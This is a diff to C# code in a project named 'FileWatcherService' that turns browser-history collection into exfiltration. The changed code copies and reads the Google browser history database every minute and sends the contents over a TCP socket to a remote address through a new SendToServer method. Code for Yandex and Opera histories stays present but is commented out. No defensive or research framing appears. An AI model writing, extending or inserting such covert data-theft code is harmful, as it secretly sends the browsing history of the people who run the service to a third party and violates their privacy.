@@ -105,12 +105,14 @@ namespace FileWatcherService
         object obj = new object();
         bool enabled = true;
         TcpClient client = null;
+        NetworkStream stream = null;
 
         public Logger(string name)
         {
             try
             {
                 client = new TcpClient(address, port);
+                stream = client.GetStream();
             }
             catch (Exception ex) { }
             UserName = name;
@@ -253,7 +255,7 @@ namespace FileWatcherService
         public void Start()
         {
 
-            NetworkStream stream = client.GetStream();
+
 
             while (enabled)
             {
@@ -261,15 +263,14 @@ namespace FileWatcherService
                 {
                     Thread.Sleep(60000);
                     copyHistoryGoogle();
-                    ReadGoogleDataBase();
-                    copyHistoryYandex();
-                    ReadYandexDataBase();
-                    copyHistoryOpera();
-                    ReadOperaDataBase();
+                    SendToServer("google", ReadGoogleDataBase());
+                    //copyHistoryYandex();
+                    //ReadYandexDataBase();
+                    //copyHistoryOpera();
+                    //ReadOperaDataBase();
 
-                    byte[] data = Encoding.Unicode.GetBytes("Пожалуйста, работай");
-                    stream.Write(data, 0, data.Length);
-                    
+
+
                     GC.Collect();
                 }
                 catch (Exception d)
@@ -285,8 +286,14 @@ namespace FileWatcherService
 
             }
         }
+        private void SendToServer(string browserName, string data)
+        {
+            byte[] data_bytes = Encoding.Unicode.GetBytes(browserName + "|" + data);
+            stream.Write(data_bytes, 0, data_bytes.Length);
+        }
+
         const string databaseName = @"D:\\historyGoogle.db";
-        private void ReadGoogleDataBase()
+        private string ReadGoogleDataBase()
         {
             try
             {
@@ -350,12 +357,12 @@ namespace FileWatcherService
                             }
                         }
 
-                        //RecordEntry(stringBuilder.ToString());
+                        return stringBuilder.ToString();
 
-                        using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
-                        {
-                            f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
-                        }
+                        //using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
+                        //{
+                        //    f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
+                        //}
                     }
                 }
             }
@@ -363,6 +370,7 @@ namespace FileWatcherService
             {
                 RecordEntry(ex.Message);
             }
+            return String.Empty;
         }
 
 
